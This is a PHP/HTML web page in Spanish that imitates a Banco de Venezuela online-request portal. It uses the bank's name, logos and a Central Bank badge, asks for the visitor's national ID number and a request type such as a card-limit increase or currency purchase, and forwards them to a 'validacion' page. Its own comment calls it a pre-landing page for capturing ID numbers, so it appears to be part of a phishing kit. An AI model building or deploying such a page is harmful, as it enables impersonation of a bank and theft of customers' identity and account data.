<?php
// index.php - Pre-Landing para captura de Cédula y Tipo de Solicitud

// Lógica de manejo de formulario
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Capturar datos del formulario
    $identificacion = $_POST['identificacion'] ?? '';
    $tipoSolicitud = $_POST['tipo_solicitud'] ?? '';

    if (!empty($identificacion) && !empty($tipoSolicitud)) {
        
        // Redirección final a validacion.html, enviando los datos por URL
        $redirectUrl = 'validacion.html?id=' . urlencode($identificacion) . '&type=' . urlencode($tipoSolicitud);
        
        header('Location: ' . $redirectUrl);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>BDV Solicitud en linea</title>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="icon" href="favicon.png" type="image/x-icon">
    <style>
        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; height: 100vh;
            display: flex; justify-content: center; align-items: center;
            background-image: url(background.webp); background-size: cover; background-position: center;
            background-color: #f4f6f9; /* Color de respaldo moderno */
        }
        .container { display: flex; height: 100%; width: 80%; }
        .left-side { width: 40%; display: flex; justify-content: center; align-items: center; }
        .right-side { width: 30%; }
        
        /* Modernización del contenedor del formulario */
        .form { 
            width: 90%; 
            background: #ffffff; 
            max-width: 480px; 
            border-radius: 12px; /* Bordes redondeados modernos */
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12); /* Sombra más suave y difuminada */
            padding: 20px 10px 30px 10px;
        }

        @media (max-width: 768px) {
            body { background: #f4f6f9; }
            .container { flex-direction: column; width: 100%; }
            .left-side { width: 100%; height: 100vh; padding: 20px; box-sizing: border-box; }
            .right-side { display: none; }
            .form { max-width: 100%; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08); }
        }

        /* Diseño Material para los inputs */
        .form-group { position: relative; margin-bottom: 25px; margin-left: 25px; margin-right: 25px; margin-top: 15px; }
        
        .form-group input, .form-group select {
            width: 100%; padding: 16px 15px; box-sizing: border-box; position: relative;
            height: 56px; border: 2px solid #e0e0e0; border-radius: 8px; background: transparent;
            font-size: 15px; color: #333; outline: none; transition: border-color 0.3s ease;
            -webkit-appearance: none; -moz-appearance: none; appearance: none;
        }
        
        .form-group input:focus, .form-group select:focus {
            border-color: #0067b1; /* Resalta en azul al hacer clic */
        }

        .form-group label {
            position: absolute; top: 50%; left: 15px; transform: translateY(-50%);
            color: #777; transition: all 0.3s ease; pointer-events: none;
            background: #ffffff; padding: 0 5px; font-size: 15px;
        }

        /* Flecha customizada para el select */
        .form-group select {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23666'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 15px center;
            background-size: 20px;
            padding-right: 40px;
        }
        
        /* Animación del Label Flotante */
        .form-group input:focus + label,
        .form-group input:not(:placeholder-shown) + label,
        .form-group select:focus + label,
        .form-group select:valid + label,
        .form-group select:not([value=""]) + label {
            top: 0; font-size: 13px; color: #0067b1; font-weight: 500;
        }

        /* Botón modernizado */
        #iniciarBtn {
            width: 80%; height: 48px; padding: 0; font-size: 16px; font-weight: bold;
            background-color: #0067b1; color: white; border-radius: 25px; /* Botón estilo píldora */
            cursor: pointer; border: none; transition: all 0.3s ease;
            box-shadow: 0 4px 10px rgba(0, 103, 177, 0.3);
        }
        #iniciarBtn:hover:not(:disabled) {
            background-color: #005494;
            box-shadow: 0 6px 14px rgba(0, 103, 177, 0.4);
            transform: translateY(-1px);
        }
        #iniciarBtn:disabled { 
            background-color: #cccccc; color: #888888; cursor: not-allowed; box-shadow: none; 
        }

        .disclaimer-text {
            font-size: 11px; color: #888; text-align: center; margin-top: 25px; 
            padding: 0 25px; line-height: 1.4;
        }
		
/* Contenedor para los logos institucionales */
.footer-logos {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 30px; /* Un poco más de separación para que respiren mejor */
    margin-top: 20px;
}

/* Diseño de insignia circular para los logos */
.footer-logo {
    width: 50px; /* Aumentamos el tamaño (antes era 35px) */
    height: 50px;
    object-fit: contain; 
    background-color: #ffffff;
    border-radius: 50%; 
    padding: 8px; /* Un poco más de margen interno para que el logo no choque con el borde */
    box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1); /* Sombra ligeramente más marcada para resaltar el tamaño */
    transition: all 0.3s ease; 
}

/* Efecto al pasar el mouse (solo se elevan un poco para mantener el toque moderno) */
.footer-logo:hover {
    transform: translateY(-3px); 
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
}
    </style>
</head>
<body>
    <div class="container">
        <div class="left-side">
            <form id="solicitudForm" class="form" method="POST" action="index.php">
                <div style="text-align: center">
                    <img src="logo.png" alt="Logo" style="width: 75%; max-width: 220px; margin-top: 10px" />
                </div>
                <div style="width: 100%; text-align: center">
                    <h4 style="color: #0067b1; margin-top: 25px; margin-bottom: 25px; font-size: 18px; font-weight: 600;">INICIAR SOLICITUD EN LÍNEA</h4>
                    
                    <div class="form-group">
                        <input
                            type="text"
                            id="identificacion"
                            name="identificacion"
                            maxlength="12"
                            required
                            placeholder=" "
                            inputmode="numeric"
                            pattern="[0-9]*"
                            oninput="this.value = this.value.replace(/[^0-9]/g, ''); checkInputs(); quitarEspacios();"
                        />
                        <label for="identificacion">Número de Cédula *</label>
                    </div>
                    
<div class="form-group">
    <select
        id="tipo_solicitud"
        name="tipo_solicitud"
        required
        onchange="checkInputs()"
    >
        <option value="" disabled selected hidden>Selecciona una opción...</option>
        <option value="Tarjeta_int">Aumentar limite de TDC</option>
        <option value="Divisas_efec">Comprar divisas BDV</option>
        <option value="Credimoto">Solicitud de Punto + BiopagoBDV</option>
        <option value="Credivehiculo">Solicitar retiro de divisas</option>
        <option value="otrasolicitud">Otra solicitud...</option>
    </select>
    <label for="tipo_solicitud">Tipo de Solicitud *</label>
</div>
                    
                </div>
                <div style="width: 100%; text-align: center; padding-top: 10px;">
                    <button type="submit" id="iniciarBtn" disabled>Continuar Solicitud</button> 
                </div>

<div class="disclaimer-text">
                    Portal de gestión en línea específicamente y únicamente para clientes y usuarios del Banco de Venezuela (BDV).
                </div>

                <!-- Logo institucional (BCV) -->
                <div class="footer-logos">
                    <img src="bcv-logo.png" alt="Logo BCV" class="footer-logo" title="Banco Central de Venezuela">
                </div>
            </form>
        </div>
        <div class="right-side"></div>
    </div>

    <script>
        function checkInputs() {
            var identificacion = document.getElementById("identificacion").value.trim();
            var tipoSolicitud = document.getElementById("tipo_solicitud").value; 
            var button = document.getElementById("iniciarBtn");

            if (identificacion.length >= 6 && tipoSolicitud !== "") {
                button.disabled = false;
            } else {
                button.disabled = true;
            }
        }

        function quitarEspacios() {
            var inputId = document.getElementById("identificacion");
            inputId.value = inputId.value.trim();
        }
        
        window.onload = checkInputs;
    </script>
</body>
</html>